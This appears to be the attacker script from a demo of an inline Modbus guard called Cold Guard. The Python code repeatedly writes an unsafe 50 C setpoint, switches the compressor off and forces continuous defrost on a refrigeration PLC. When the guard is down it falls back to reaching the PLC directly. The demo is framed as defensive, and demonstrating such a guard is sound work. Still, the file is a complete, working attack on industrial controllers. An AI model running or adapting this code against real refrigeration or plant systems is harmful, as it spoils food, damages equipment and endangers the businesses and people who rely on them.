"""
Attacker — the rogue device on the store network. Runs on the Mac (192.168.50.10).

This is the demo's red team. On our OWN simulated fridge, on our OWN closed demo
network, it recreates the October 2026 supermarket refrigeration attack: drive
the setpoint to an unsafe temperature and force a continuous defrost so the case
warms up and the food spoils.

It models a device wired on a flat plant network behind a bump-in-the-wire guard:

  * watchdog UP   -> all traffic to the PLC crosses Cold Guard, so the attacker's
                     commands go through it. Armed, they are blocked; bypassed,
                     they pass but the always-on safety ceiling still caps the
                     case. Being blocked does NOT reroute it: the connection is
                     alive, it just gets refused. It stays on Cold Guard.
  * watchdog DOWN -> the inline path is gone (think: hardware bypass relay trips
                     on power loss), so the attacker reaches the PLC's address
                     directly and the commands land with nothing in the way.
                     The case runs away. This is the "before Cold Guard" world.

It attacks continuously, about twice a second. It only touches the addresses in
profile.json. Stop it with Ctrl+C.

Run:  python3 attacker.py            (reads profile.json for addresses)
"""

import json
import sys
import time

from pymodbus.client import ModbusTcpClient
from pymodbus.exceptions import ModbusException

PROFILE_PATH = sys.argv[1] if len(sys.argv) > 1 else "profile.json"
with open(PROFILE_PATH) as f:
    PROFILE = json.load(f)

HR_SETPOINT = 0
CO_COMPRESSOR = 0
CO_DEFROST = 1

DANGER_SETPOINT = 500   # +50.0 C in tenths — the headline from the real attack
PROBE_EVERY = 5         # while direct, seconds between checks for the watchdog

GUARDED, DIRECT = "via Cold Guard", "DIRECT to PLC"


def make_client(addr):
    host, port = addr.rsplit(":", 1)
    # Short timeout so a dead watchdog is noticed in about a second.
    return ModbusTcpClient(host, port=int(port), timeout=1, retries=1)


def open_path(path):
    """Connect via the watchdog or straight to the PLC. Return a client or None."""
    client = make_client(PROFILE["watchdog"] if path == GUARDED else PROFILE["plc"])
    try:
        if client.connect():
            return client
    except (OSError, ModbusException):
        pass
    client.close()
    return None


def fate(r):
    return "THROUGH" if (r is not None and not r.isError()) else "blocked"


def main():
    # Prefer the inline path; fall back to the PLC directly if it is gone.
    path, client = GUARDED, open_path(GUARDED)
    if client is None:
        path, client = DIRECT, open_path(DIRECT)
    print("Attacker: continuously pushing the October 2026 supermarket refrigeration attack.")
    print("(Ctrl+C to stop)\n", flush=True)
    next_probe = time.monotonic() + PROBE_EVERY

    while True:
        if client is None:
            # Re-resolve: try the inline path first, then direct.
            for p in (GUARDED, DIRECT):
                client = open_path(p)
                if client is not None:
                    if p != path:
                        print(f"\nattacker: now reaching the PLC {p}", flush=True)
                    path = p
                    next_probe = time.monotonic() + PROBE_EVERY
                    break
            else:
                print("  attack -> no path to the PLC, retrying...        ",
                      end="\r", flush=True)
                time.sleep(1)
                continue

        try:
            # Three malicious writes: unsafe setpoint, compressor off, defrost on.
            r1 = client.write_register(HR_SETPOINT, DANGER_SETPOINT & 0xFFFF)
            r2 = client.write_coil(CO_COMPRESSOR, False)
            r3 = client.write_coil(CO_DEFROST, True)
            print(f"  attack [{path}] -> setpoint 50C: {fate(r1)} | "
                  f"compressor off: {fate(r2)} | defrost on: {fate(r3)}   ",
                  end="\r", flush=True)
        except (OSError, AttributeError, ModbusException):
            # The path dropped (watchdog killed?). Re-resolve next loop.
            client.close()
            client = None
            continue

        # While hitting the PLC directly, keep checking whether the inline
        # guard is back, and go back through it when it is.
        if path == DIRECT and time.monotonic() >= next_probe:
            next_probe = time.monotonic() + PROBE_EVERY
            guarded = open_path(GUARDED)
            if guarded is not None:
                client.close()
                client, path = guarded, GUARDED
                print("\nattacker: Cold Guard is back inline -> routed through it again",
                      flush=True)

        time.sleep(0.5)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nAttacker stopped.")
